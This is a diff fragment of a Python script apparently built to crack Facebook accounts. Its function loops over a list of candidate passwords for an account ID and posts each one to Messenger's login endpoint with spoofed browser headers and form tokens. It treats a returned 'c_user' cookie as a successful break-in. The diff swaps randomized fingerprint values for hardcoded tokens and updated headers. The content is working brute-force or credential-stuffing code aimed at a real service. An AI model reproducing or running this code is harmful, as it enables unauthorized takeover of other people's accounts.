@@ -1138,56 +1138,35 @@ def m5(idf,pw):
  try:
   for ps in pw:
    session = requests.Session()
-   timezone = random.choice([-720, -660, -600, -540, -480, -420, -360, -300, -240, -180, -120, -60, 0, 60, 120, 180, 240, 300, 360, 420, 480, 540, 600, 660, 720])
-   dimensions = {
-    "w": random.randint(1200, 1920),
-    "h": random.randint(800, 1080),
-    "aw": random.randint(1200, 1920),
-    "ah": random.randint(800, 1080),
-    "c": random.randint(10, 30)}
-   lgndim = base64.b64encode(urllib.parse.urlencode(dimensions).encode()).decode()
-   pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
-    'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-    'initial_request_id': str(uuid.uuid4()),
-    'timezone': timezone,
-    'lgndim': lgndim,
-    'lgnrnd': f"{random.randint(100000, 999999)}_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5))}",
+    'jazoest': '21013',
+    'lsd': 'AVoNqhiYMBw',
+    'initial_request_id': 'A5ewuXzRI6deVS_ILE6Cwqn',
+    'timezone': '-330',
+    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+    'lgnrnd': '075930_jSAa',
     'lgnjs': 'n',
     'email': idf,
     'pass': ps,
-    'default_persistent': ''}
+    'default_persistent': '',}
    header_freefb = {
-    "authority": "www.messenger.com",
-    "method": "POST",
-    "path": "/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",
-    "scheme": "https",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
-    "Cache-Control": "max-age=0",
-    "Content-Length": "142",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Dpr": "1",
-    "Origin": "https://www.messenger.com",
-    "Priority": "u=0, i",
-    "Referer": "https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
-    "Sec-Ch-Prefers-Color-Scheme": "dark",
-    "Sec-Ch-Ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-    "Sec-Ch-Ua-Full-Version-List": '"Google Chrome";v="125.0.6422.142", "Chromium";v="125.0.6422.142", "Not.A/Brand";v="24.0.0.0"',
-    "Sec-Ch-Ua-Mobile": "?0",
-    "Sec-Ch-Ua-Model": '""',
-    "Sec-Ch-Ua-Platform": '"Windows"',
-    "Sec-Ch-Ua-Platform-Version": '"10.0.0"',
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-User": "?1",
-    "Upgrade-Insecure-Requests": "1",
-    "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-    "Viewport-Width": "885"} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'sb=IZovZjfFcBxaOX-lSlL3L9tO; datr=IZovZsmiZrheEEaOQAXaIjXG; ps_n=1; ps_l=1; wd=885x773',
+    'origin': 'https://www.messenger.com',
+    'priority': 'u=0, i',
+    'referer': 'https://www.messenger.com/login/password/',
+    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
    lo = session.post('https://www.messenger.com/login/password/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
